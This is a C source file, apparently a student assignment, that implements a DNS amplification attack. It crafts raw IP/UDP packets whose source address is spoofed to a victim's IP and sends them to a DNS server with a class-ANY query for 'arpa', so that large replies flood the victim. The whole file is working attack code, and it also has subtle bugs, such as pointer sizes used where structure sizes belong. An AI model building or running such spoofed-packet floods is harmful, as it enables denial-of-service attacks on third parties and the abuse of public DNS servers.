#include "dnsamp.h"

void PrintError(char *error){
	printf("%s\n", error);
	exit(-1);
}

void CreateDnsHeader(dh *dns){
	// QUERY_ID uses the last 16 bits of my student id, which is defined in dnsamp.h
	dns->query_id = (unsigned short) htons(QUERY_ID);
	dns->addrr = 0;
	dns->anscount = 0;
	dns->authrr = 0;
	dns->flags = htons(FLAG_Q);
	dns->qcount = htons(1);
}

void CreateQueryInfo(query *q){
	q->dnsq_class = htons(0x00ff);
	q->dnsq_type = htons(1);
}

void CreatePseudoHeader(ph *psheader, char* spoofip, char* dnsip){
	inet_pton(AF_INET, spoofip, &psheader->saddr);
	inet_pton(AF_INET, dnsip, &psheader->daddr);
	psheader->fill = 0;
	psheader->proto = IPPROTO_UDP;
}

// Calculate UDP checksum
unsigned short CheckIpUdpSum(int length, unsigned short *ptr){
	long sum = 0;
	unsigned short odd = 0;

	for(; length > 1; length -= 2){
		sum += *ptr++;
	}
	if(length == 1){
		*((unsigned char *)&odd) = *(unsigned char *)ptr;
		sum += odd;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);

	return (short)~sum;

}

void SendDnsPacket(char* dnsip, char* spoofip, int port){
	int sd;
	unsigned char dns_data[128];
	char buf[4096], *data, *psdata;
	unsigned char* dns_server;
	struct sockaddr_in sin, din;
	memset(buf, 0, 4096);

	dh *dnsheader = (dh *)&dns_data;
	CreateDnsHeader(dnsheader);

	dns_server = (unsigned char *)&dns_data[sizeof(dh)];
	*dns_server++ = '\4';
	*dns_server++ = 'a';
	*dns_server++ = 'r';
	*dns_server++ = 'p';
	*dns_server++ = 'a';
	*dns_server++ = '\0';
	int length = strlen(dns_server) + 1;
	query *Query = (query *)&dns_data[(sizeof(dnsheader) + length)];
	CreateQueryInfo(Query);

	data = buf + sizeof(ih) + sizeof(uh);
	memcpy(data, &dns_data, sizeof(dh) + length + sizeof(Query) + 1);

	sin.sin_family = AF_INET;
	din.sin_family = AF_INET;
	sin.sin_port = htons(53);
	din.sin_port = htons(port);
	inet_pton(AF_INET, dnsip, &sin.sin_addr.s_addr);
	inet_pton(AF_INET, spoofip, &din.sin_addr.s_addr);

	ih *ipheader = (ih *)buf;
	ipheader->ihl = 5;
	ipheader->version = 4;
	ipheader->tos = 0;
	ipheader->tot_len = htons(sizeof(ih) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length);
	ipheader->id = htons(QUERY_ID);
	ipheader->ttl = 64;
	ipheader->protocol = IPPROTO_UDP;
	inet_pton(AF_INET, spoofip, &ipheader->saddr);
	inet_pton(AF_INET, dnsip, &ipheader->daddr);
	ipheader->check = 0;
	ipheader->check = CheckIpUdpSum(sizeof(ih) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length, (unsigned short *)buf);

	uh *udpheader = (uh *)(buf + sizeof(ih));
	udpheader->source = htons(port);
	udpheader->dest = htons(53);
	udpheader->len = htons(8 + sizeof(dh) + sizeof(Query) + length);
	udpheader->check = 0;
	
	ph pseudoheader;
	CreatePseudoHeader(&pseudoheader, spoofip, dnsip);
	pseudoheader.len = htons(sizeof(uh) + sizeof(dh) + length + sizeof(Query));
	int size = sizeof(ph) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length;
	psdata = malloc(size);

	memcpy(psdata, (char*)&pseudoheader, sizeof(ph));
	memcpy(psdata + sizeof(ph), udpheader, sizeof(uh) + sizeof(dh) + sizeof(Query) + length);

	udpheader->check = CheckIpUdpSum(size, (unsigned short *)psdata);

	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sd < 0){
		printf("sd = %d\n", sd);
		PrintError("socket error");
	}
	else{
		sendto(sd, buf, ipheader->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
	}
	close(sd);
	return;

}